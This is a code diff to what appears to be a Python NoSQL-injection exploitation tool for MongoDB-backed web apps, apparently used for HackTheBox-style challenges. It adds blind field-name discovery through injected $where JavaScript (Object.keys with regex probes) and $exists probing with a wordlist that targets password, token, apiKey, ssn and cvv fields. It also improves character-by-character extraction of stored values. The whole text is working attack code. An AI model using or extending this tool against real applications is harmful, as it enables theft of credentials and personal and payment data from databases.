@@ -62,6 +62,7 @@ def args():
         ["--extractUsers", "Enumerate ALL users, not just the first (y/n)"],
         ["--extractMethod", "Extraction backend: auto (default), regex, or where ($where this.field)"],
         ["--dump", "In-band dump: re-send the match-all payload and show the records the injection returns (GET/search endpoints) (y)"],
+        ["--discover", "Discover document field/column names ($where Object.keys, else $exists wordlist) (y)"],
         ["--noWhere", "Skip the $where JavaScript technique (y)"],
         ["--csrfField", "Form field carrying an anti-CSRF token (carried, refreshed, on every request)"],
         ["--csrfUrl", "URL to GET a fresh CSRF token from (default: the target URL)"],
@@ -487,21 +488,33 @@ def _char_class(chars):
     return "[" + esc + "]"
 
 
-def _walk_value(is_true, charset, maxlen, label=""):
+def _walk_value(is_true, charset, maxlen, label="", widen=None):
     # Binary-search each character: ~log2(len(charset)) requests per char.
+    # If no active-charset char extends the value, try a wider charset ONCE
+    # before stopping, so we don't silently truncate (e.g. the default charset
+    # has no '{', so 'HTB' would look complete when the value is 'HTB{...}').
+    active = list(charset)
+    widened = False
     value = ""
     while len(value) < maxlen:
-        if not is_true("^" + re.escape(value) + _char_class(charset)):
+        if not is_true("^" + re.escape(value) + _char_class(active)):
+            if widen and not widened:
+                wider = [c for c in widen if c not in active]
+                if wider and is_true("^" + re.escape(value) + _char_class(active + wider)):
+                    active = active + wider
+                    widened = True
+                    if label:
+                        print("\n    [charset auto-widened after '%s']" % value)
+                    continue
             break
-        chars = list(charset)
-        lo, hi = 0, len(chars)
+        lo, hi = 0, len(active)
         while hi - lo > 1:
             mid = (lo + hi) // 2
-            if is_true("^" + re.escape(value) + _char_class(chars[lo:mid])):
+            if is_true("^" + re.escape(value) + _char_class(active[lo:mid])):
                 hi = mid
             else:
                 lo = mid
-        value += chars[lo]
+        value += active[lo]
         if label:
             print("\r    %s: %s" % (label, value), end="")
     if label:
@@ -608,6 +621,113 @@ def _where_is_true(ctx, method, base_url, vector, fields_literal, inj_field, tem
     return is_true
 
 
+# ---------------------------------------------------------------------------
+# Field / "column" discovery
+# ---------------------------------------------------------------------------
+
+_KEY_CHARSET = string.ascii_letters + string.digits + "_"
+
+_COMMON_FIELDS = [
+    "_id", "id", "name", "title", "username", "user", "login", "email", "mail",
+    "password", "passwd", "pass", "pwd", "hash", "salt", "role", "roles", "group",
+    "isAdmin", "is_admin", "admin", "active", "enabled", "verified", "apiKey",
+    "api_key", "apikey", "token", "secret", "key", "flag", "ssn", "cc", "cvv",
+    "phone", "address", "city", "country", "zip", "first_name", "last_name",
+    "firstName", "lastName", "dob", "createdAt", "updatedAt", "status", "type",
+    "trackingNum", "tracking", "data", "value", "note", "comment", "description",
+]
+
+
+def discover_where(ctx, method, base_url, vector, fields_literal, where, maxlen=40):
+    # Enumerate document key names via $where Object.keys() -- works even on
+    # strict-key queries, the most general discovery method.
+    inj, tmpl = where["field"], where["template"]
+
+    def probe(testexpr):
+        spec = {n: ("lit", fields_literal[n]) for n in fields_literal}
+        spec[inj] = ("lit", tmpl % testexpr)
+        return _send(ctx, method, base_url, vector, spec)
+
+    try:
+        true_sig, false_sig = probe("true"), probe("false")
+    except requests.RequestException:
+        return []
+    if not _states_differ(true_sig, false_sig):
+        return []
+
+    keys = []
+    while len(keys) < 64:
+        excl = "[" + ",".join("'%s'" % k for k in keys) + "]"
+
+        def is_true(pattern, _excl=excl):
+            jsp = pattern.replace("/", "\\/")
+            js = ("Object.keys(this).filter(function(k){return %s.indexOf(k)<0;})"
+                  ".some(function(k){return /%s/.test(k);})" % (_excl, jsp))
+            try:
+                return _classify_true(probe(js), true_sig, false_sig)
+            except requests.RequestException:
+                return False
+
+        k = _walk_value(is_true, _KEY_CHARSET, maxlen, widen=_CHARSET_FULL)
+        if not k or k in keys:
+            break
+        keys.append(k)
+        print("    [+] field: %s" % k)
+    return keys
+
+
+def discover_exists(ctx, method, base_url, vector, fields_literal, wordlist=None):
+    # Test candidate field names with {name:{$exists:true}} -- works when the app
+    # queries by the request body (find(req.body)).  A canary guards against
+    # strict-key apps that ignore extra fields (which would false-positive).
+    wordlist = wordlist or _COMMON_FIELDS
+
+    def probe(overrides):
+        spec = {n: ("op", "$ne", _rand()) for n in fields_literal}
+        spec.update(overrides)
+        return _send(ctx, method, base_url, vector, spec)
+
+    try:
+        ref_match = probe({})                                          # all docs match
+        ref_no = probe({n: ("lit", _rand()) for n in fields_literal})  # nothing matches
+        canary = probe({"nx_" + _rand(): ("ops", {"$exists": True})})  # bogus field
+    except requests.RequestException:
+        return []
+    if not _states_differ(ref_match, ref_no):
+        return []
+    if _classify_true(canary, ref_match, ref_no):
+        return []   # app ignores extra fields (strict-key) -> $exists discovery N/A
+
+    found = []
+    for name in wordlist:
+        if name in fields_literal:
+            continue
+        try:
+            p = probe({name: ("ops", {"$exists": True})})
+        except requests.RequestException:
+            continue
+        if _classify_true(p, ref_match, ref_no):
+            found.append(name)
+            print("    [+] field: %s" % name)
+    return found
+
+
+def discover_fields(ctx, method, base_url, vector, fields_literal, findings):
+    print("\n[*] Field/column discovery...")
+    where = next((f["where"] for f in findings if f.get("where")), None)
+    found = []
+    if where:
+        found = discover_where(ctx, method, base_url, vector, fields_literal, where)
+    if not found:
+        found = discover_exists(ctx, method, base_url, vector, fields_literal)
+    if found:
+        print("[+] Discovered %d field(s): %s" % (len(found), ", ".join(found)))
+    else:
+        print("[-] No fields discovered via injection (strict-key query / no $where).")
+        print("    On in-band endpoints the field labels are visible in --dump output.")
+    return found
+
+
 def extract(base_url, method, vector, fields_literal, field, headers=None, verify=False,
             charset=None, maxlen=64, exclude=None, pin=None, ctx=None, where=None,
             ext_method="auto"):
@@ -618,7 +738,7 @@ def extract(base_url, method, vector, fields_literal, field, headers=None, verif
     if ext_method in ("auto", "regex"):
         is_true = _regex_is_true(ctx, method, base_url, vector, fields_literal, field, pin, exclude)
         if is_true:
-            return _walk_value(is_true, charset, maxlen, label=field)
+            return _walk_value(is_true, charset, maxlen, label=field, widen=_CHARSET_FULL)
         typed = _extract_typed(ctx, method, base_url, vector, fields_literal, field, pin, exclude)
         if typed is not None:
             print("    %s = %s (typed)" % (field, typed))
@@ -628,7 +748,7 @@ def extract(base_url, method, vector, fields_literal, field, headers=None, verif
         wis = _where_is_true(ctx, method, base_url, vector, fields_literal,
                              where["field"], where["template"], field)
         if wis:
-            return _walk_value(wis, charset, maxlen, label=field)
+            return _walk_value(wis, charset, maxlen, label=field, widen=_CHARSET_FULL)
     return None
 
 
@@ -821,6 +941,13 @@ def run(base_url, method, fields_literal, headers=None, verify=False, args=None)
             print("\n=== POSSIBLE (status-only change, may be a WAF) ===")
             for f in weak:
                 print("[?] %s (%s): %s" % (f["label"], f["vector"], "; ".join(f["reasons"])))
+
+    # Field/column discovery.
+    do_discover = str(getattr(args, "discover", "") or "").lower() == "y" if args is not None else False
+    if args is None and strong:
+        do_discover = input("\nDiscover document field names? (y/n) ").lower() == "y"
+    if do_discover and strong:
+        discover_fields(ctx, method, base_url, strong[0]["vector"], fields_literal, findings)
 
     # In-band dump: re-send the match-all payload and show the returned records.
     do_dump = False
